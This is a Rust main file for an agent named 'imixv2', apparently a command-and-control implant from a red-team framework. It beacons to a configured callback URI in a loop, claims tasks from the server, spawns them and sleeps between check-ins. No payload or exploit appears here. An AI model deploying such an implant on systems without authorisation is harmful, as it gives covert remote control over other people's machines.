extern crate alloc;

use anyhow::{Context, Result};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
pub use pb::config::Config;
pub use transport::{ActiveTransport, Transport};

mod agent;
mod shell;
mod task;
#[cfg(test)]
mod tests;
mod version;
use crate::version::VERSION;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        pretty_env_logger::formatted_timed_builder()
            .filter_level(log::LevelFilter::Info)
            .parse_env("IMIX_LOG")
            .init();
    }
    log::info!("Starting imixv2 agent");

    // Load config / defaults
    let config = Config::default_with_imix_verison(VERSION);

    let transport = ActiveTransport::new(config.callback_uri.clone(), None)
        .context("Failed to initialize transport")?;

    let handle = tokio::runtime::Handle::current();
    let task_registry = TaskRegistry::new();
    let agent = Arc::new(ImixAgent::new(
        config,
        transport,
        handle,
        task_registry.clone(),
    ));

    loop {
        match agent.fetch_tasks().await {
            Ok(tasks) => {
                if tasks.is_empty() {
                    log::info!("Callback success, no tasks to claim")
                }
                for task in tasks {
                    log::info!("Claimed task: {}", task.id);
                    task_registry.spawn(task, agent.clone());
                }
            }
            Err(e) => {
                log::error!("Callback failed: {e:#}");
            }
        }

        let interval = agent.get_callback_interval_u64();
        sleep(Duration::from_secs(interval)).await;
    }
}
